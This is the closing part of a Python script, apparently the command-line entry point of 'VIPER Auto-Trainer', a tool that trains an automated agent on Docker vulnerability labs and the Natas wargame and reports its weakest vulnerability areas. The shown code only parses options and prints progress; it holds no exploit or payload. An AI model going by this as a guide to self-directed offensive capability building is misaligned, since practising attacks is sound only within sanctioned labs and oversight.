    weak = state.get_weakest_vulns(5)
    print(f"\nWeakest Areas (need training): {weak}")

    if state.lab_completions:
        print(f"\nLab Completions: {state.lab_completions}")

    if state.improvement_log:
        last = state.improvement_log[-1]
        print(f"\nLast Improvement ({last['timestamp'][:10]}):")
        for imp in last.get("improvements", []):
            print(f"  - {imp}")


async def main():
    if len(sys.argv) < 2:
        print("VIPER Auto-Trainer")
        print("=" * 40)
        print()
        print("Usage:")
        print("  python viper_train.py                # Full auto-training (all labs + Natas)")
        print("  python viper_train.py --labs          # Docker labs only")
        print("  python viper_train.py --natas         # Continue Natas only")
        print("  python viper_train.py --bench         # Benchmark current skills")
        print("  python viper_train.py --report        # Show training report")
        print("  python viper_train.py --self-improve  # Analyze failures + improve")
        print("  python viper_train.py --cycles N      # Full training with N cycles")
        return

    trainer = ViperTrainer()

    if "--report" in sys.argv:
        print_report()
    elif "--bench" in sys.argv:
        trainer.benchmark()
    elif "--self-improve" in sys.argv:
        trainer.self_improve()
    elif "--labs" in sys.argv:
        await trainer.run_labs_only()
    elif "--natas" in sys.argv:
        await trainer.run_natas_only()
    else:
        cycles = 3
        if "--cycles" in sys.argv:
            idx = sys.argv.index("--cycles")
            if idx + 1 < len(sys.argv):
                cycles = int(sys.argv[idx + 1])
        await trainer.run_full_training(cycles=cycles)


if __name__ == "__main__":
    asyncio.run(main())
